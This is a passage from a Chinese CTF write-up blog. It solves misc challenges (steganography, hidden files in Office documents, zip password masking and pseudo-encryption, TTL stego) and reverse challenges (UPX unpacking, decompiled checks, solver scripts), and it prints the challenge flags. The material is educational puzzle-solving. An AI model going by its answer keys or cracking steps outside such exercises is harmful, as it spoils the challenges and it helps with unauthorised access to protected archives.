class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后获得了一张flag.gif的动图，没发现什么特殊之处，打开wp发现是帧与帧之间的时间是不同的，使用下面的命令获取帧与帧之间的时间间隔。</p><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">└─$ identify -format &quot;%T&quot; flag.gif2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytess <span class="token operator">=</span> <span class="token string">'205050205050205020502020205020202020505020502050205020505050505020205050202020502050505020502020'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'20'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'50'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># mD5_1t</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="office文件相关"><a href="#office文件相关" class="headerlink" title="office文件相关"></a>office文件相关</h2><h3 id="word文件内藏文件"><a href="#word文件内藏文件" class="headerlink" title="word文件内藏文件"></a>word文件内藏文件</h3><p>因为office文件的近似于压缩包的格式，使得我们可以将想隐藏的文件藏入解压缩后的各个目录或者文件内，但是一般这样生搬硬套地隐写会导致office文件打开时内容乱码，所以对于office文件，一般来说，有内容乱码的就是文件内藏入了一些文件或者文本。</p><h4 id="bugku、眼见非实"><a href="#bugku、眼见非实" class="headerlink" title="bugku、眼见非实"></a>bugku、眼见非实</h4><p>这个题打开之后出现乱码，直接改后缀名为zip，解压一下找到<code>word-&gt;document.xml</code>文件，打开搜索flag发现flag<code>flag&#123;F1@g&#125;</code></p><h4 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h4><p>打开之后内容很正常，后缀名改为zip解压之后在media文件夹内发现flag的图片</p><p><img src="/2021/05/28/CTF/image23.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">utflag&#123;unz1p_3v3ryth1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="压缩包密码"><a href="#压缩包密码" class="headerlink" title="压缩包密码"></a>压缩包密码</h2><h3 id="buu、-GUET-CTF2019-zips"><a href="#buu、-GUET-CTF2019-zips" class="headerlink" title="buu、[GUET-CTF2019]zips"></a>buu、[GUET-CTF2019]zips</h3><p><strong>TAG:伪加密、掩码爆破</strong></p><p>真加密爆破得第一层得口令为<code>723456</code>，第二层是个简单的伪加密，解出来得<code>flag.zip</code>、<code>setup.sh</code></p><pre class="line-numbers language-none"><code class="language-none">print(__import__(&#39;time&#39;).time())  # setup.sh文件的主要python代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>意思就是取出当前的时间作为<code>flag.zip</code>压缩包的密码，这里先看一下这个密码的格式(执行一下上面的python2代码)</p><pre class="line-numbers language-none"><code class="language-none">1622897453.55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>太长了，爆破估计是不太可能的，但是注意到这里有上一次的修改日期，有可能进行掩码爆破</p><p><img src="/2021/05/28/CTF/image-20210605204224196.png" alt></p><p>就是对小数点之后的内容进行爆破，将<code>2019-5-17 16:40:15</code>转换为时间戳为<code>1558082415</code>，设置初始的掩码为<code>1558082415.??</code>，如果没找到，就一位一位地向前移动掩码，最后掩码为<code>155808????.??</code>是获得口令为<code>1558080832.15</code>，解压得flag：</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="buu、-MRCTF2020-千层套路"><a href="#buu、-MRCTF2020-千层套路" class="headerlink" title="buu、[MRCTF2020]千层套路"></a>buu、[MRCTF2020]千层套路</h3><p><strong>TAG：zip多层加密、二维码像素、python脚本解</strong></p><p>给的时zip文件，套了很多层，每一层的密码就是这一层的压缩文件的文件名(不带上后缀名的文件名)，一层层解用脚本即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile<span class="token keyword">import</span> osname <span class="token operator">=</span> <span class="token string">'0573'</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ziip<span class="token punctuation">:</span>        ziip<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        delname <span class="token operator">=</span> name        name <span class="token operator">=</span> ziip<span class="token punctuation">.</span>filelist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>delname <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得出文件<code>qr.zip</code>，解压出txt文件，用脚本再转成图片，200x200的图片</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'qr.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> data<span class="token punctuation">:</span>    a <span class="token operator">=</span> data<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        aa <span class="token operator">=</span> a<span class="token punctuation">[</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'255'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210606142548031.png" alt></p><p>用手机QQ扫一下得flag(QQ我滴超人)</p><pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="buu、真实的压缩包"><a href="#buu、真实的压缩包" class="headerlink" title="buu、真实的压缩包"></a>buu、真实的压缩包</h3><p>给出两个压缩包，一个名为虚假的压缩包、一个名为真实的压缩包。虚假的压缩包为伪加密，里面是个简单的rsa</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">11</span>q <span class="token operator">=</span> <span class="token number">3</span>n <span class="token operator">=</span> <span class="token number">33</span>phi <span class="token operator">=</span> <span class="token number">20</span>c <span class="token operator">=</span> <span class="token number">26</span>e <span class="token operator">=</span> <span class="token number">3</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"key: 答案是</span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后解压出真实的压缩包，图片为高度隐写</p><p><img src="/2021/05/28/CTF/image-20210804214154795.png" alt></p><p>然后将亦真亦假文件与字符5进行异或，下面是脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'亦真亦假'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>data1 <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">5</span>    data1 <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后新建一个空白文件，将上面得出来的结果复制进去就行了</p><p><img src="/2021/05/28/CTF/image-20210804222354932.png" alt></p><p>然后发现是word应该，后缀名改为doc，颜色隐藏文本</p><p><img src="/2021/05/28/CTF/image-20210804222507880.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">FLAG&#123;_th2_7ru8_2iP_&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="buu、-ACTF新生赛2020-明文攻击"><a href="#buu、-ACTF新生赛2020-明文攻击" class="headerlink" title="buu、[ACTF新生赛2020]明文攻击"></a>buu、[ACTF新生赛2020]明文攻击</h3><p>题目提示，明文攻击。</p><p>一层层打开发现图片与带密码的压缩包，压缩包里面有两个文件，根据题目提示，思路应该是从图片里面提取出来一个明文，借以解开压缩包的密码，使用。那就先对图片进行操作，但是很明显使用foremost都没分离出来，那就是后面的格式有点错误了，只能手动用winhex分了。</p><p><img src="/2021/05/28/CTF/image-20210910184341499.png" alt></p><p>打开发现里面是<code>flag.txt</code>，明文攻击的要素都满足了，打开工具直接一把梭了。</p><p><img src="/2021/05/28/CTF/image-20210911002725745.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">ACTF&#123;3te9_nbb_ahh8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="给出字串"><a href="#给出字串" class="headerlink" title="给出字串"></a>给出字串</h2><blockquote><p>misc中常见给出字串让转为文件或者其他什么东西的题型，就是给你一串或长或短的数字，让你解一下这段内容，转换一下获得文件或者明文。</p></blockquote><h3 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h3><blockquote><p>​    IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。<br>​    如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</p></blockquote><h4 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h4><p>给出的文件的内容只有<code>63 127 191 255</code>四个数字，此时考虑ttl隐写。</p><p><code>00 替换 63 01 替换 127 10 替换 191 11 替换 255</code></p><p>写出脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attachment.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'63\n'</span><span class="token punctuation">,</span> <span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'127\n'</span><span class="token punctuation">,</span> <span class="token string">'01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'191\n'</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'255\n'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    再将文件内的内容复制粘贴到winhex里面，然后似乎文件头没有<code>50</code>不知道是不是我个人的问题。</p><p>​    然后zip伪加密，务必使用010editor，看起来zip伪加密更清晰一点。</p><p>​    里面又是base家族的多重加密，使用我个人开发的专属解题脚本解出flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210804233925939.png" alt></p><h2 id="含逆向的misc"><a href="#含逆向的misc" class="headerlink" title="含逆向的misc"></a>含逆向的misc</h2><h3 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h3><p>这题很简单，直接改计算机的系统时间即可</p><p><img src="/2021/05/28/CTF/image-20200917204620215.png" alt></p><p><img src="/2021/05/28/CTF/image-20200917204556945.png" alt></p><pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;We1cOm3_70_cyber_security&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="方向介绍与解题思路"><a href="#方向介绍与解题思路" class="headerlink" title="方向介绍与解题思路"></a>方向介绍与解题思路</h2><h3 id="方向的简单介绍"><a href="#方向的简单介绍" class="headerlink" title="方向的简单介绍"></a>方向的简单介绍</h3><p>reverse方向在实战中表现为计算机软件破解，有一般的c与c++作为反编译内容的破解、有基于c#的软件的破解、有基于java的逆向破解等等。</p><p>而在CTF中，reverse的出题模式一般有下面的几种</p><h3 id="一般的逆向题"><a href="#一般的逆向题" class="headerlink" title="一般的逆向题"></a>一般的逆向题</h3><h3 id="一般的迷宫题"><a href="#一般的迷宫题" class="headerlink" title="一般的迷宫题"></a>一般的迷宫题</h3><h2 id="一般逆向-啥都没有，简单的算法"><a href="#一般逆向-啥都没有，简单的算法" class="headerlink" title="一般逆向(啥都没有，简单的算法)"></a>一般逆向(啥都没有，简单的算法)</h2><h3 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h3><p>先查pe，注意到是UPX壳，直接拉到虚拟机内脱壳</p><p><img src="/2021/05/28/CTF/image-20210531101308798.png" alt="image-20210531101308798"></p><p>然后直接拖入ida32，跟踪到如下的主要代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  _BYTE v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+12h] [ebp-2Eh] BYREF</span>  _DWORD v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-22h]</span>  _BYTE v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Ah] [ebp-16h] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Fh] [ebp-11h]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+33h] [ebp-Dh]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+37h] [ebp-9h]</span>  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-5h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-4h]</span>  <span class="token function">sub_401A10</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"*F'\"N,\"(I?+@"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">65</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">67</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">84</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">70</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">123</span> <span class="token operator">||</span> v10 <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_402000<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一看就是简单的古典密码而已，直接脚本出</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">"*F'\"N,\"(I?+@"</span>dic <span class="token operator">=</span> <span class="token string">r"&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?>=&lt;;:9876543210/.-,+*)("</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x27</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;%$# !\""</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> dic<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> flag <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;U9X_1S_W6@T?&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="buu、Youngter-drive"><a href="#buu、Youngter-drive" class="headerlink" title="buu、Youngter-drive"></a>buu、Youngter-drive</h3><p>首先给的是exe文件就先验验壳，UPX壳，直接脱了。</p><p>或者使用OD手工脱了，<a href="https://blog.csdn.net/kevin66654/article/details/79135861">关于OD的手工脱壳的教程</a>。</p><p>然后拉入ida32简单分析。注意到创建了两个单独的线程来进行加密，两个线程的函数分别为<code>StartAddress</code>、<code>sub_41119F</code>。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main_0</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    HANDLE v4<span class="token punctuation">;</span> <span class="token comment">// [esp+D0h] [ebp-14h]</span>    HANDLE hObject<span class="token punctuation">;</span> <span class="token comment">// [esp+DCh] [ebp-8h]</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sub_4110FF<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">::</span>hObject <span class="token operator">=</span> <span class="token function">CreateMutexW</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">j_strcpy</span><span class="token punctuation">(</span>Destination<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Source<span class="token punctuation">)</span><span class="token punctuation">;</span>        hObject <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> StartAddress<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    v4 <span class="token operator">=</span> <span class="token function">CreateThread</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sub_41119F<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_418008 <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token punctuation">;</span>    <span class="token function">sub_411190</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">CloseHandle</span><span class="token punctuation">(</span><span class="token operator">::</span>hObject<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span 